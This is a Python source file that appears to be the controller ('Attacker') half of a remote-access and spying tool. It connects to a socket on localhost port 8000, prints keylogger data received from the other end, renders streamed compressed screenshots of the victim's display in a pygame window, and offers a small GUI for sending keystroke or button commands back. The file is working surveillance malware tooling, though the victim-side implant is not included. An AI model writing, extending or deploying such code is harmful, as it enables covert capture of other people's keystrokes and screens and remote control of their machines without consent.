import socket
import struct
import json
import base64
import pygame
from zlib import decompress
import customtkinter
import tkinter as tk
from tkinter import messagebox
import threading


WIDTH = 1900
HEIGHT = 1000

class Attacker():
    def __init__(self):
        self.client_socket = socket.socket()
        self.client_socket.connect(("127.0.0.1", 8000))
        Main(self.client_socket)


class Main():
    def __init__(self, client_socket):
        self.client_socket = client_socket
        SuperSocket(self.client_socket).send_msg(("1").encode())
        threading.Thread(target=self.command_window).start()
        self.screen_cap = Screen()
        self.operation()
        
    def operation(self):
        while True:
            data = (SuperSocket(self.client_socket).recv_msg()).decode()
            message = json.loads(data)
            
            if message["type"] == "logger":
                print(message["data"])
                
            elif message["type"] == "screen":
                self.screen_cap.show(message["data"])
            else:
                print("wrong")
                
    def command_window(self):
        Command_Strokes_Window(self.client_socket).mainloop()

class Screen():
    def __init__(self):
        pygame.init()
        self.screen = pygame.display.set_mode((WIDTH, HEIGHT))
        self.clock = pygame.time.Clock()
        self.watching = True
        
    def show(self, encoded_image):
        self.encoded_image = encoded_image
        try:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    self.watching = False
                    break
                
            image_bytes = base64.b64decode(self.encoded_image)
            decompressed_pixels = decompress(image_bytes)

            img = pygame.image.fromstring(decompressed_pixels, (WIDTH, HEIGHT), 'RGB')

            self.screen.blit(img, (0, 0))
            pygame.display.flip()
            self.clock.tick(60)
        except:
            print("error")
            

class Command_Strokes_Window(customtkinter.CTk):
    def __init__(self, client_socket):
        self.client_socket = client_socket
        
        super().__init__()
        self.title("MZVG_Project.py")
        self.geometry("780x520")
        # call .on_closing() when app gets closed
        self.protocol("WM_DELETE_WINDOW", self.exit)

        # ============ create two frames ============

        # configure grid layout (2x1)
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.frame_left = customtkinter.CTkFrame(
            master=self, width=180, corner_radius=0)
        self.frame_left.grid(row=0, column=0, sticky="nswe")

        self.frame_right = customtkinter.CTkFrame(master=self)
        self.frame_right.grid(row=0, column=1, sticky="nswe", padx=20, pady=20)

        # ============ frame_left ============

        # configure grid layout (1x11)
        # empty row with minsize as spacing
        self.frame_left.grid_rowconfigure(0, minsize=10)
        self.frame_left.grid_rowconfigure(5, weight=1)  # empty row as spacing
        # empty row with minsize as spacing
        self.frame_left.grid_rowconfigure(8, minsize=20)
        # empty row with minsize as spacing
        self.frame_left.grid_rowconfigure(11, minsize=10)

        self.label_hello_friend = customtkinter.CTkLabel(master=self.frame_left, text="Hello my friend", font=(
            "Roboto Medium", -16))  # font name and size in px
        self.label_hello_friend.pack(pady=10, padx=10)

        self.button_exit = customtkinter.CTkButton(
            master=self.frame_left, text="Exit", command=self.exit)
        self.button_exit.pack(pady=10, padx=20)

        # ============ frame_right ============

        # configure grid layout (3x7)
        self.frame_right.rowconfigure((0, 1, 2, 3), weight=1)
        self.frame_right.rowconfigure(7, weight=10)
        self.frame_right.columnconfigure((0, 1), weight=1)
        self.frame_right.columnconfigure(2, weight=0)

        # ============ frame_right ============

        self.command_entry = customtkinter.CTkEntry(
            master=self.frame_right, width=120, placeholder_text="Enter Command")
        self.command_entry.grid(row=8, column=0, columnspan=2,
                        pady=20, padx=20, sticky="we")

        self.button_send_command = customtkinter.CTkButton(
            master=self.frame_right, text="Send Command", border_width=2, fg_color=None,  command=self.send_command)
        self.button_send_command.grid(
            row=8, column=2, columnspan=1, pady=20, padx=20, sticky="we")

        self.textbox_of_commands = tk.Listbox(master=self)
        self.textbox_of_commands.grid(row=0, column=0, columnspan=2, padx=(
            220, 40), pady=(40, 80), sticky="nsew")
        

    
    def send_command(self):
        self.message = self.command_entry.get()
        if "" == self.message:
            messagebox.showerror(
                'Error', "you must to write some thing!")
        else:
            self.splited_message = self.message.split(" ")
            message = {
                "type": "command",
                "command": self.splited_message[0],
                "buttons": self.splited_message[1]
            }
            message_to_send = json.dumps(message)
            SuperSocket(self.client_socket).send_msg((message_to_send).encode())
            
    def exit(self):  # back to the main window
        self.destroy()
        self.client_socket.close()
        exit()


class SuperSocket():
    def __init__(self, current_socket):  # make the self.current_socket euqal to current_socket
        self.current_socket = current_socket

    # create a pack with length of message and message and sending this pack to server
    def send_msg(self, msg):
        msg = struct.pack('>I', len(msg)) + msg
        self.current_socket.send(msg)

    def recv_msg(self):  # getting the message and understading what is the length of the message and return the the message
        raw_msglen = self.recvall(4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        return self.recvall(msglen)

    def recvall(self, msglen):  # getting the whole message and returning the data to the recv_msg
        data = b''
        while len(data) < msglen:
            packet = self.current_socket.recv(msglen - len(data))
            if not packet:
                return None
            data += packet
        return data


if __name__ == '__main__':
    Attacker()
